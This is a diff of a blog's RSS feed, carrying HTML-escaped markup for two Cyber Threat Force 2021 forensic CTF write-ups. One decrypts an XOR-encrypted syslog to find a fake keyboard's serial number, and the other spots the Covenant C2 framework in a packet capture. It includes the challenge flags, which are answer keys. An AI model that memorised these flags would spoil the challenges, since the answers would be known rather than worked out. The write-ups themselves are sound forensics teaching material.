+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python2 xor-kpa.py -d &amp;lt;&lt;span style="color:#f92672">(&lt;/span>echo &lt;span style="color:#e6db74">&amp;#39;Linux 5.10.0-kali8-amd64 xhci-hcd&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> syslog.enc &amp;gt; syslog
+$ head -n &lt;span style="color:#ae81ff">5&lt;/span> syslog
+Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:25 kali usbmuxd&lt;span style="color:#f92672">[&lt;/span>117991&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>22:53:25.287&lt;span style="color:#f92672">][&lt;/span>3&lt;span style="color:#f92672">]&lt;/span> Connecting to new device on location 0x10004 as ID &lt;span style="color:#ae81ff">1&lt;/span>
+Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:25 kali usbmuxd&lt;span style="color:#f92672">[&lt;/span>117991&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>22:53:25.287&lt;span style="color:#f92672">][&lt;/span>3&lt;span style="color:#f92672">]&lt;/span> Connected to v2.0 device &lt;span style="color:#ae81ff">1&lt;/span> on location 0x10004 with serial number 4b8d611f609abfc5471ae40d08d0c8b785eab9d4
+Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:27 kali ModemManager&lt;span style="color:#f92672">[&lt;/span>830&lt;span style="color:#f92672">]&lt;/span>: &amp;lt;info&amp;gt; &lt;span style="color:#f92672">[&lt;/span>base-manager&lt;span style="color:#f92672">]&lt;/span> couldn&lt;span style="color:#e6db74">&amp;#39;t check support for device &amp;#39;&lt;/span>/sys/devices/pci0000:00/0000:00:08.1/0000:03:00.3/usb1/1-2&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>: not supported by any plugin
+Jun &lt;span style="color:#ae81ff">8&lt;/span> 00:16:16 kali lynis&lt;span style="color:#f92672">[&lt;/span>144261&lt;span style="color:#f92672">]&lt;/span>: - usbmuxd.service: &lt;span style="color:#f92672">[&lt;/span> UNSAFE &lt;span style="color:#f92672">]&lt;/span>
+Jun &lt;span style="color:#ae81ff">8&lt;/span> 00:16:22 kali lynis&lt;span style="color:#f92672">[&lt;/span>118776&lt;span style="color:#f92672">]&lt;/span>: - Checking usb-storage driver &lt;span style="color:#f92672">(&lt;/span>modprobe config&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span> NON DESACTIVÉ &lt;span style="color:#f92672">]&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>That seems like a valid syslog! After looking for a short while, we find:&lt;/p>
+&lt;pre>&lt;code>Apr 12 20:21:25 kali kernel: [ 1.830063] usb 1-2: Product: Fake_KeyBoard
 Apr 12 20:21:25 kali kernel: [ 1.830064] usb 1-2: Manufacturer: APT43.
 Apr 12 20:21:25 kali kernel: [ 1.830065] usb 1-2: SerialNumber: 854be9ee57ef47ce74e73904998d61c8846e9239
 &lt;/code>&lt;/pre>&lt;p>The flag is &lt;code>CYBERTF{854be9ee57ef47ce74e73904998d61c8846e9239}&lt;/code>.&lt;/p>
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/usb-key-cemetery">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Welcome to the matrix</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/</link><pubDate>Fri, 09 Jul 2021 22:31:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/</guid><description>For this challenge, we were given a pcapng file. The flag is meant to be CYBERTF{c2 framework used in leet speak}. Running strings on the capture, we see:
 $ strings c2.pcapng ... 3d77 7o0~ b|}p l69s Covenant0 210520070857Z 310519070857Z0 Covenant0 ~vVz&amp;#34;/ loq5 ... Covenant is a well known C2 framework. The flag is CYBERTF{C0V3N4NT}.
 You can view the sources on github or read other writeups.</description><content>&lt;p>For this challenge, we were given a pcapng file. The flag is meant to be &lt;code>CYBERTF{c2 framework used in leet speak}&lt;/code>. Running strings on the capture, we see:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ strings c2.pcapng
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3d77
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7o0~
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b|&lt;span style="color:#f92672">}&lt;/span>p
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>l69s
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Covenant0
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>210520070857Z
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>310519070857Z0
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Covenant0
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>~vVz&lt;span style="color:#e6db74">&amp;#34;/
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">loq5
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">...
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/cobbr/Covenant">Covenant&lt;/a> is a well known C2 framework. The flag is &lt;code>CYBERTF{C0V3N4NT}&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ strings c2.pcapng
+...
+3d77
+7o0~
+b|&lt;span style="color:#f92672">}&lt;/span>p
+l69s
+Covenant0
+210520070857Z
+310519070857Z0
+Covenant0
+~vVz&lt;span style="color:#e6db74">&amp;#34;/
+&lt;/span>&lt;span style="color:#e6db74">loq5
+&lt;/span>&lt;span style="color:#e6db74">...
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/cobbr/Covenant">Covenant&lt;/a> is a well known C2 framework. The flag is &lt;code>CYBERTF{C0V3N4NT}&lt;/code>.&lt;/p>
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/welcome-to-the-matrix">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item></channel></rss>
